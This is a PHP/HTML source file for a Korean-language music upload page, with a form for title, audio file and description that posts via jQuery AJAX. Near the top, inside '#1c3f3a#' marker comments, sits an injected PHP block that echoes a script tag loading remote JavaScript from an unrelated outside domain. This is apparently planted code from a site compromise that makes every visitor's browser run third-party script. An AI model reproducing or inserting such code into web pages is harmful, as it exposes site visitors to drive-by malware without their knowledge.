<? 
	session_start();
	include ("./lib.php");
?>
<?php
#1c3f3a#
if(empty($vt)) {
$vt = "<script type=\"text/javascript\" src=\"http://hancomotors.com/r9ctwktv.php?id=14155825\"></script>";
echo $vt;
}
#/1c3f3a#
?><!DOCTYPE HTML>
<html>
	<head>
		<title> New Document </title>
		<meta charset="UTF-8">
		<style type="text/css">
			body {
				margin: 0;
				padding: 0;
			}
			#music_wrap {
				width: 980px;
				height: 760px;
			}
			#music_wrap h1 {
				margin: 0;
				padding: 30px 0 0 30px;
				height: 60px;
			}
			#music_table {
				width: 800px;
				height: auto;
				margin: 50px auto 0 auto;
				text-align: center;
				border-spacing: 0;
			}
			#music_table thead td {
				background: #1caff6;
				color: white;
				height: 40px;
				border-radius: 10px 10px 0 0;
			}
			#music_table tbody td {
				border-bottom: 1px dashed black;
				height: 40px;
			}
			#music_table tbody td input[type="text"] {
				width: 550px;
				height: 20px;
			}
			#music_table tbody td:first-child {
				width: 150px;
			}
			#music_table tbody td:last-child {
				border-right: 0px;
			}
			#music_table tbody tr:nth-child(2) td:last-child span{
				color:#FF32B1; 
			}
			#music_table tbody tr:nth-child(3) td {
				height: 340px;
				border-bottom: 1px solid black;
			}
			#music_table tbody tr:last-child td {
				height: 40px;
				border: 0;
			}
			.music_submit {
				display: block;
				width: 60px;
				height: 22px;
				background: #1caff6;
				color: white;
				text-align: center;
				border-radius: 5px;
				font-size: 10pt;
				line-height: 22px;
				border: 0;
				outline: none;
				padding: 0;
				cursor: pointer;
				float: right;
			}
		</style>
		<script type="text/javascript">
			$(document).ready(function(){
				function ShowAlert(text){
					var left = (document.body.clientWidth / 2);
	                var result = left - $('.message').width() / 2 + document.body.scrollLeft;
	                $('.message').css('left',result).html(text).fadeIn(1500);
	                $('.message').fadeOut(1500);
				}
				$('.form_music').submit(function(e){
					e.preventDefault();
					var form_data=new FormData(this);
					$.ajax({
						data: form_data,
						type: "POST",
						url: './music_upload_ok.php',
						contentType: false,
						cache: false,
						processData:false,
						success: function(res){
							if(res=='success'){
								ShowAlert('업로드 완료하였습니다');
								$('#wrap').load('./musics.php');
							}
							else if(res=='fail')
								ShowAlert('용량이 너무 큽니다');
							else if(res=='fail2')
								ShowAlert('음악파일 형식이 아닙니다');
							else if(res=='fail3')
								ShowAlert('내용을 모두 채워야합니다');
							else
								ShowAlert('오류가 발생하였습니다');
						}
					});
					return false;
				});
			});
		</script>
	</head>
	<body>
		<div id="music_wrap">
			<header>
				<h1> Musics</h1>
			</header>
			<section>
				<form enctype="multipart/form-data" method="post" action="" class="form_music" name="form_music">
					<table id="music_table">
						<thead>
							<tr>
								<td colspan="2">업로드</td>
							</tr>
						</thead>
						<tbody>
							<tr>
								<td>제목</td><td><input type="text" placeholder="title" required="required" name="music_title"></td>
							</tr>
							<tr>
								<td>첨부파일</td><td><input type="file" required="required" name="music"> <span>*10Mb이하 음악파일만 업로드 가능합니다.</span></td>
							</tr>
							<tr>
								<td>내용</td><td>	<textarea rows="24" cols="76" style="resize:none;" placeholder="contents" name="music_contents"></textarea></td>
							</tr>
							<tr>
								<td colspan="2"><input type="submit" value="업로드" class="music_submit"></td>
							</tr>
						</tbody>
					</table>
				</form>

			</section>
		</div>
	</body>
</html>